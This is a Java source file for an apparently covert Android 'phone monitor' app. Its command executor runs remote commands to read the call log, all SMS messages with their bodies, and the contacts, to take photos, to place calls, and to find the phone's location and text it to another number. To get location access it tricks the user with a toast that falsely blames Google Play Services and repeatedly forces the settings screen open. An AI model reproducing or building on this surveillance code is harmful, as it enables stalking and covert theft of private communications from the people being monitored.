package com.monitor.phone.s0ft.phonemonitor;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.Vibrator;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.support.annotation.RequiresApi;
import android.support.v4.app.ActivityCompat;
import android.telephony.SmsManager;
import android.util.Log;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Callable;

import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;


public class WebCommandsExecutor implements LocationListener {
    private final Context context;
    MainActivity checkPermissions = new MainActivity();

    WebCommandsExecutor(Context context) {
        this.context = context;
    }


    void vibrate(final int repeatTimes, String vibPatternString) {
        String[] patternTokens = vibPatternString.split(" ");
        List<Long> vibPatternList = new ArrayList<Long>();
        for (String patternToken : patternTokens) {
            try {
                long patternTokenLong = Long.parseLong(patternToken);
                vibPatternList.add(patternTokenLong);
            } catch (NumberFormatException nfex) {
                //Do nothing, skip this token
            }
        }
        long[] finalPattern = new long[vibPatternList.size()];
        long totalSleepTime = 0;
        for (int i = 0; i < vibPatternList.size(); i++) {
            finalPattern[i] = vibPatternList.get(i);
            totalSleepTime += finalPattern[i];
        }
        final long finalTotalSleepTime = totalSleepTime;
        final long[] finalFinalPattern = finalPattern;
        final Vibrator vibrator = (Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
        if (vibrator != null) {
            if (vibrator.hasVibrator()) {
                new Thread() {
                    @Override
                    public void run() {
                        for (int i = 1; i <= repeatTimes; i++) {
                            vibrator.vibrate(finalFinalPattern, -1);
                            try {
                                Thread.sleep(finalTotalSleepTime);//vibrate is asynchronous, so sleep
                            } catch (InterruptedException itex) {
                                //thread execution was interrupted
                            }
                        }

                    }
                }.start();

            }
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.M)
    void call(long phoneNumber) {
        Intent intent = new Intent(Intent.ACTION_CALL);
        intent.setData(Uri.parse("tel:" + phoneNumber));
        intent.setFlags(FLAG_ACTIVITY_NEW_TASK);
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        context.startActivity(intent);
    }

    @SuppressLint("MissingPermission")
    @RequiresApi(api = Build.VERSION_CODES.M)
    String getGPSCoordinates(int promptUserLocationOn, final Boolean showPromptToast, final String sendSMSToNumber) {
        //promptUserLocationOn=Number of times to forcibly take user to Location settings
        //showPromptToast=Whether or not to show a toast message to user prompting to enable Location Service
        //sendSMSToNumber=Number to send latlong SMS to.. Can be "" in which case SMS will not be sent
        String latLong = "";
        final LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
        if (locationManager != null) {
            while (!(locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) || locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) && promptUserLocationOn > 0) {
                //if neither GPS nor NETWORK location provider is enabled,
                Handler handler = new Handler(Looper.getMainLooper());
                handler.post(new Runnable() {
                    @Override
                    public void run() {
                        if (showPromptToast)
                            Toast.makeText(context.getApplicationContext(), "Google Play Services requires Location Services to be enabled.", Toast.LENGTH_LONG).show();
                    }
                });
                Intent intent = new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS);
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
                try {
                    Thread.sleep(10000);
                } catch (InterruptedException iex) {
                }
                promptUserLocationOn--;
            }
            Location location = null;
            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                //use gps
                locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 50, 0, this, Looper.getMainLooper());
                try {
                    HelperMethods.waitWithTimeoutN(new Callable() {
                        @Override
                        public Object call() throws Exception {
                            try {
                                return locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                            } catch (SecurityException sec) {
                                Log.e("Location not Permitted", sec.getMessage());
                                return sec.getMessage();
                            }
                        }
                    }, null, 3 * 60 * 1000);//wait for GPS based location. this takes a couple minutes
                } catch (Exception ex) {
                    Log.w(AppSettings.getTAG(), ex.getMessage());
                }
                location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            }
            if (location == null) {
                if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                    //use network
                    locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 50, 0, this, Looper.getMainLooper());
                    try {
                        HelperMethods.waitWithTimeoutN(new Callable() {
                            @Override
                            public Object call() throws Exception {
                                try {
                                    return locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                                } catch (SecurityException | IllegalArgumentException securityException) {
                                    Log.e("Location Not accepted", securityException.getMessage());
                                    return securityException.getMessage();
                                }
                            }
                        }, null, 5000);//network based location is quick. only wait 5s
                    } catch (Exception ex) {
                        Log.w(AppSettings.getTAG(), ex.getMessage());
                    }
                    location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                }
            }
            if (location != null) {
                Log.w(AppSettings.getTAG(), "Lat : " + location.getLatitude() + "\n" + "Long : " + location.getLongitude());
                latLong = "Lat : " + location.getLatitude() + "\nLong : " + location.getLongitude();
                if (!sendSMSToNumber.equals("")) {
                    SmsManager smsManager = SmsManager.getDefault();
                    smsManager.sendTextMessage(sendSMSToNumber, null, latLong, null, null);
                }
            } else {
                Log.w(AppSettings.getTAG(), "No location found");
            }
        }


        return latLong;
    }

    @RequiresApi(api = Build.VERSION_CODES.M)
    String getCallLog() {
        //returns calllogs as a JSON array string in descending order of date
        String retval = "";
        JSONArray callLogsJSONArr = new JSONArray();
        String[] columns = {CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION, CallLog.Calls.CACHED_NAME};

        @SuppressLint("MissingPermission") Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, columns, null, null, CallLog.Calls.DATE + " DESC");
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                String type_ = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                int type__ = Integer.parseInt(type_);
                String type;
                switch (type__) {
                    case CallLog.Calls.INCOMING_TYPE:
                        type = "Incoming";
                        break;
                    case CallLog.Calls.MISSED_TYPE:
                        type = "Missed";
                        break;
                    case CallLog.Calls.OUTGOING_TYPE:
                        type = "Outgoing";
                        break;
                    default:
                        type = "Type " + type_;
                }
                String date = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE));
                String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));

                try {
                    JSONObject indivCallLog = new JSONObject();
                    indivCallLog.put("Number", number);
                    indivCallLog.put("Type", type);
                    indivCallLog.put("Date", date);
                    indivCallLog.put("Duration", duration);
                    indivCallLog.put("Name", name);//if name is null, which can be if the number isn't saved, the Name entry is not added to this JSON object
                    callLogsJSONArr.put(indivCallLog);
                } catch (JSONException jsex) {
                    //error making json object. do nothing. don't append to JSON array
                }
            }
            cursor.close();
            retval = callLogsJSONArr.toString();
        }


        return retval;
    }

    String getSMSMessages() {
        //Returns a JSON array string of JSON objects of SMS messages; "" if failed
        //the SMS content provider is undocumented as of yet(27th Dec, 2017 | 10:59PM | GMT+05:45).
        //the following links and some testing on my part went into making of this method
        //http://grepcode.com/file/repo1.maven.org/maven2/org.robolectric/android-all/4.1.2_r1-robolectric-0/android/provider/Telephony.java#Telephony.TextBasedSmsColumns
        //https://stackoverflow.com/questions/1976252/how-to-use-sms-content-provider-where-are-the-docs
        //the messages are by default retrieved in descending order of date

        String retval = "";
        JSONArray smsJsonArr = new JSONArray();


        Uri smsUri = Uri.parse("content://sms");
        String[] columns = {"type", "thread_id", "address", "date", "read", "body"};
        Cursor cursor = context.getContentResolver().query(smsUri, columns, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                int type_ = cursor.getInt(cursor.getColumnIndex("type"));
                String type;
                switch (type_) {
                    case 1:
                        type = "Inbox";
                        break;
                    case 2:
                        type = "Sent";
                        break;
                    case 3:
                        type = "Draft";
                        break;
                    case 4:
                        type = "Outbox";
                        break;
                    case 5:
                        type = "Failed";
                        break;
                    case 6:
                        type = "Queued";
                        break;
                    default:
                        type = "Type " + type_;
                }
                int threadid = cursor.getInt(cursor.getColumnIndex("thread_id"));
                String address = cursor.getString(cursor.getColumnIndex("address"));

                //get the contact name corresponding to the number(address)
                String personName = "";
                Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(address));
                Cursor phoneLookupCursor = context.getContentResolver().query(uri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
                if (phoneLookupCursor != null) {
                    if (phoneLookupCursor.moveToNext()) {
                        personName = phoneLookupCursor.getString(phoneLookupCursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));
                    }
                    phoneLookupCursor.close();
                }

                String date = cursor.getString(cursor.getColumnIndex("date"));
                int read = cursor.getInt(cursor.getColumnIndex("read"));
                String body = cursor.getString(cursor.getColumnIndex("body"));

                try {
                    JSONObject indivSMS = new JSONObject();
                    indivSMS.put("ThreadId", threadid);
                    indivSMS.put("Type", type);
                    indivSMS.put("Address", address);
                    indivSMS.put("Date", date);
                    indivSMS.put("ReadStatus", read);
                    indivSMS.put("Body", body);
                    indivSMS.put("PersonName", personName);//personName is "" if the address(number) couldn't be resolved into a contact name
                    smsJsonArr.put(indivSMS);
                } catch (JSONException jsex) {
                    //error while creating json object/array. skip this entry
                }
            }
            cursor.close();
            retval = smsJsonArr.toString();
        }
        return retval;

    }

    String getContacts() {
        String retval = "";
        JSONArray contactsJSONArr = new JSONArray();

        Cursor contactCursor = context.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, ContactsContract.Contacts.DISPLAY_NAME);
        if (contactCursor != null) {
            while (contactCursor.moveToNext()) {
                String id = contactCursor.getString(contactCursor.getColumnIndex(ContactsContract.Contacts._ID));
                String displayName = contactCursor.getString(contactCursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                String timesContacted = contactCursor.getString(contactCursor.getColumnIndex(ContactsContract.Contacts.TIMES_CONTACTED));
                String lastContacted = contactCursor.getString(contactCursor.getColumnIndex(ContactsContract.Contacts.LAST_TIME_CONTACTED));
                if (Integer.parseInt(contactCursor.getString(contactCursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    Cursor phoneCursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=?", new String[]{id}, null);
                    if (phoneCursor != null) {
                        while (phoneCursor.moveToNext()) {
                            String phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                            try {
                                JSONObject contact = new JSONObject();
                                contact.put("Name", displayName);
                                contact.put("Number", phoneNumber);
                                contact.put("TimesContacted", timesContacted);
                                contact.put("LastContacted", lastContacted);
                                contactsJSONArr.put(contact);
                            } catch (JSONException jsex) {
                                //do nothing. skip putting into array
                            }
                        }
                        phoneCursor.close();
                    }
                }
            }
            contactCursor.close();
            retval = contactsJSONArr.toString();
        }

        return retval;
    }

    String clickPhotos(final CameraCapture.PictureCaptureMethod pictureCaptureMethod){
        CameraCapture cameraCapture=new CameraCapture(context);
        return cameraCapture.TakePicture(pictureCaptureMethod);
    }

    @Override
    public void onLocationChanged(Location location) {

    }

    @Override
    public void onStatusChanged(String s, int i, Bundle bundle) {

    }

    @Override
    public void onProviderEnabled(String s) {

    }

    @Override
    public void onProviderDisabled(String s) {

    }
}
